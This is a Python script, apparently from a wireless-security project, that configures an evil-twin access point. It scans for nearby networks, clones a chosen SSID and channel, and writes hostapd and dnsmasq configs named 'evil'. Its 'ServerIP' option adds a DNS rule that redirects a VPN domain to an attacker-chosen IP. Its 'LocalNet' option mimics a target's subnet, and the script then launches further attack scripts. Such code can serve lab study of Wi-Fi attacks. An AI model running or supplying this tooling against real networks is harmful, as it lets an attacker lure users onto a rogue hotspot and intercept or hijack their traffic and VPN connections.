#!/usr/bin/env python3
import subprocess, re, json, sys, os, time, socket

class UnifiedAPConfig:
    def __init__(self):
        self.wifi = None
        self.eth = None
        self.ap_interface = "ap0"

        self.ssid = None
        self.bssid = None
        self.channel = 6
        self.enc = None
        self.password = "password"
        self.manual = False

        self.attack = None   # localnet, serverip, none

        # LocalNet
        self.local_target = None
        self.local_target_ip = None
        
        # ServerIP
        self.vpn_domain = None
        self.spoof_ip = None
        
        # AP network defaults
        self.ap_ip = "192.168.1.1"
        self.subnet = "192.168.1.0/24"
        self.dhcp_start = "192.168.1.10"
        self.dhcp_end = "192.168.1.100"

    def run(self, cmd):
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return p.stdout

    def detect_interfaces(self):
        out = self.run("ip link show")
        wifi, eth = [], []
        for line in out.split("\n"):
            m = re.match(r'^\d+:\s+(\S+):', line)
            if not m: continue
            iface = m.group(1)
            if iface.startswith(("wl", "wlan")):
                wifi.append(iface)
            elif iface.startswith(("eth","en")):
                eth.append(iface)
        return wifi, eth
    
    def scan(self, iface):
        print("\nScanning...")
        out = self.run(f"sudo iw dev {iface} scan")
        nets, cur = [], {}
        for line in out.split("\n"):
            line = line.strip()
            if line.startswith("BSS "):
                if cur: nets.append(cur)
                b = re.search(r'BSS\s+([0-9a-f:]+)', line)
                cur = {"bssid": b.group(1) if b else "", "ssid": "", "chan":0, "enc":"Open", "sig":0}
            elif "SSID:" in line:
                cur["ssid"] = line.split(":",1)[1].strip()
            elif "channel" in line:
                c = re.search(r'channel\s+(\d+)', line)
                if c: cur["chan"] = int(c.group(1))
            elif "signal:" in line:
                s = re.search(r'signal:\s+([-\d.]+)', line)
                if s: cur["sig"] = float(s.group(1))
            elif "WPA" in line or "RSN" in line:
                cur["enc"] = "WPA2"
        if cur: nets.append(cur)
        return [n for n in nets if n["ssid"]]

    # attack config
    def config_localnet(self):
        print("\nLocalNet Attack")
        tgt = input("Target domain/IP: ").strip()
        if not tgt: return False
        
        try:
            ip = tgt if re.match(r'\d+\.\d+\.\d+\.\d+', tgt) else socket.gethostbyname(tgt)
        except:
            print("Could not resolve.")
            return False

        base = ".".join(ip.split(".")[:3])
        self.ap_ip = f"{base}.1"
        self.subnet = f"{base}.0/24"
        self.dhcp_start = f"{base}.10"
        self.dhcp_end = f"{base}.100"

        self.local_target = tgt
        self.local_target_ip = ip
        return True

    def config_serverip(self):
        print("\nServerIP Attack")
        domain = input("VPN domain: ").strip()
        if not domain: return False
        target = input("IP/domain to spoof to: ").strip()
        if not target: return False

        try:
            ip = target if re.match(r'\d+\.\d+\.\d+\.\d+', target) else socket.gethostbyname(target)
        except:
            print("Resolve failed")
            return False
        
        self.vpn_domain = domain
        self.spoof_ip = ip
        return True


    def setup(self):
        # interfaces
        wifi, eth = self.detect_interfaces()
        if not wifi: sys.exit("No WiFi found.")
        if not eth: sys.exit("No Ethernet found.")

        print("\n"+"="*80)
        print("\nWiFi Interfaces:")
        for i,n in enumerate(wifi,1): print(f"{i}. {n}")
        self.wifi = wifi[int(input("Choose: "))-1]

        print("\n"+"="*80)
        print("\nEthernet Interfaces:")
        for i,n in enumerate(eth,1): print(f"{i}. {n}")
        self.eth = eth[int(input("Choose: "))-1]

        # AP mode
        print("\n"+"="*80)
        print("\n1. Clone Network\n2. Manual AP")
        m = input("Select: ").strip()
        if m == "1":
            nets = self.scan(self.wifi)
            for i,n in enumerate(nets,1):
                print(f"{i}. {n['ssid']} ({n['chan']}) {n['enc']}")
            t = nets[int(input("Select network: "))-1]
            self.ssid = t["ssid"]
            self.bssid = t["bssid"]
            self.channel = t["chan"]
            self.enc = t["enc"]
            if self.enc == "WPA2":
                pw = input("Password (default=password): ").strip()
                if pw: self.password = pw
        else:
            self.manual = True
            self.ssid = input("SSID: ").strip()
            self.channel = int(input("Channel (1-11): ") or "6")
            self.enc = "WPA2" if input("Open(1)/WPA2(2): ").strip() != "1" else "Open"
            if self.enc == "WPA2":
                while True:
                    p = input("Password: ").strip()
                    if len(p) >= 8:
                        self.password = p
                        break

        # Attack selection
        print("\n"+"="*80)
        print("\n1. LocalNet\n2. ServerIP\n3. None")
        ch = input("Select attack: ").strip()
        if ch == "1":
            self.attack = "localnet"
            if not self.config_localnet(): sys.exit(1)
        elif ch == "2":
            self.attack = "serverip"
            if not self.config_serverip(): sys.exit(1)
        else:
            self.attack = None


    def hostapd(self):
        cfg = f"""
interface={self.ap_interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
"""
        if self.enc == "WPA2":
            cfg += f"""wpa=2
wpa_passphrase={self.password}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
        with open("/tmp/hostapd-evil.conf","w") as f: f.write(cfg)

    def dnsmasq(self):
        cfg = f"""
interface={self.ap_interface}
bind-interfaces
dhcp-range={self.dhcp_start},{self.dhcp_end},12h
dhcp-option=3,{self.ap_ip}
dhcp-option=6,{self.ap_ip}
server=8.8.8.8
server=1.1.1.1
"""
        if self.attack == "serverip":
            cfg += f"address=/{self.vpn_domain}/{self.spoof_ip}\n"

        with open("/tmp/dnsmasq-evil.conf","w") as f: f.write(cfg)

    def save(self):
        data = {
            "wifi": self.wifi,
            "eth": self.eth,
            "ssid": self.ssid,
            "channel": self.channel,
            "enc": self.enc,
            "password": self.password,
            "attack": self.attack,
            "local_target": self.local_target,
            "local_target_ip": self.local_target_ip,
            "vpn_domain": self.vpn_domain,
            "spoof_ip": self.spoof_ip,
            "ap_ip": self.ap_ip,
            "subnet": self.subnet,
        }
        with open("/tmp/evil.json","w") as f: json.dump(data,f,indent=2)

def main():
    if os.geteuid() != 0:
        print("Run as root.")
        sys.exit(1)
    c = UnifiedAPConfig()
    c.setup()
    c.hostapd()
    c.dnsmasq()
    c.save()
    print("\n"+"="*80)
    print("\nConfigs written to /tmp/")
    directory = '/home/lain/wns_project/scripts/1'
    if c.attack == "serverip":
        subprocess.run(["python3", f"{directory}/ap-start-serverip.py"], check=True)
    elif c.attack == "localnet":
        subprocess.run(["python3", f"{directory}/ap-start-localnet.py"], check=True)

if __name__ == "__main__":
    main()
